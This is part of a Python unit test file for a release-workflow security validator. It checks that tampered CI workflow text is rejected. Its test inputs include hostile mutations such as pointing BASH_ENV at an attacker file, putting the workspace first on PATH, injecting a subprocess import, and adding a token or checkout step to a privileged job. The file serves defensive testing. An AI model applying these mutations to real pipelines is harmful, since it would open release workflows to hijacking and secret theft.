            "preflight",
            direct,
            '          true && "$ARC_NODE_BIN" -e \'process.exit(0)\'\n' + direct,
        )

    def test_rejects_expanding_or_changed_privileged_python_heredocs(self) -> None:
        self.assert_secret_mutation_rejected(
            "vault",
            "/usr/bin/python3 -I - \"$plain_tar\" <<'PY'",
            '/usr/bin/python3 -I - "$plain_tar" <<PY',
        )
        self.assert_secret_mutation_rejected(
            "vault",
            "          import pathlib, stat, sys, tarfile",
            "          import subprocess\n          import pathlib, stat, sys, tarfile",
        )

    def test_rejects_path_startup_alias_and_floating_node_regressions(self) -> None:
        for old, new in (
            ('          BASH_ENV: ""', '          BASH_ENV: /tmp/owned'),
            ("          export PATH='/usr/bin:/bin'", "          export PATH='$GITHUB_WORKSPACE:/usr/bin:/bin'"),
            ("          unalias -a 2>/dev/null || true", "          true"),
            ("          node-version: 24.20.0", "          node-version: 24"),
            ("          /usr/bin/ssh-keygen -Y sign", "          ssh-keygen -Y sign"),
        ):
            with self.subTest(old=old):
                self.assert_secret_mutation_rejected("preflight", old, new)

    def test_rejects_post_patch_delete_or_unbounded_immutability_wait(self) -> None:
        for old, new in (
            ('              if [ "$publication_attempted" != true ]; then', '              if true; then'),
            ("          for poll_attempt in {1..12}; do", "          while true; do"),
            (
                "          RELEASE_ID: ${{ needs.publish-draft.outputs.release_id }}\n"
                "          PUBLICATION_STATE: ${{ steps.finalize.outputs.publication_state }}",
                "          GH_TOKEN: ${{ github.token }}\n"
                "          RELEASE_ID: ${{ needs.publish-draft.outputs.release_id }}\n"
                "          PUBLICATION_STATE: ${{ steps.finalize.outputs.publication_state }}",
            ),
        ):
            with self.subTest(old=old):
                mutated = self.texts["release"].replace(old, new, 1)
                self.assertNotEqual(mutated, self.texts["release"])
                with self.assertRaises(BoundaryError):
                    validate_publish_authority(mutated)
        mutated = self.texts["release"].replace(
            "and .draft == true and .immutable == false", "and .id == $id"
        )
        self.assertNotEqual(mutated, self.texts["release"])
        with self.assertRaises(BoundaryError):
            validate_publish_authority(mutated)

    def test_rejects_checkout_or_git_hook_surface_in_write_job(self) -> None:
        mutated = self.texts["release"].replace(
            "    steps:\n      # This privileged job deliberately has no checkout.",
            "    steps:\n      - uses: actions/checkout@deadbeef\n\n"
            "      # This privileged job deliberately has no checkout.",
            1,
        )
        with self.assertRaises(BoundaryError):
            validate_publish_authority(mutated)


if __name__ == "__main__":
    unittest.main(verbosity=2)
